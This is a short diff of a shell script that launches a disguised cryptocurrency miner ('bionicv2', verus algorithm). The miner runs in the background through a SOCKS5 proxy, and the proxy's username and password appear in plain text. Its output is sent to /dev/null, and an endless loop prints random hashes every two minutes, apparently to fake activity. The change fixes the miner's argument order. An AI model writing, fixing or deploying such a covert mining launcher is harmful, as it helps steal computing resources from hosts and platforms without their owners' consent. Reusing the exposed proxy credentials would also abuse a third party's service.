@@ -10,5 +10,5 @@ wallet="$1"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
 proxy="socks5://gtfrmnnv:h7l3wob1wn3m@45.131.212.65:6114"
-./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p -x $proxy >/dev/null &
+./bionicv2 -a verus -o $pool -u $wallet.$workername -p x -t $thread -x $proxy >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
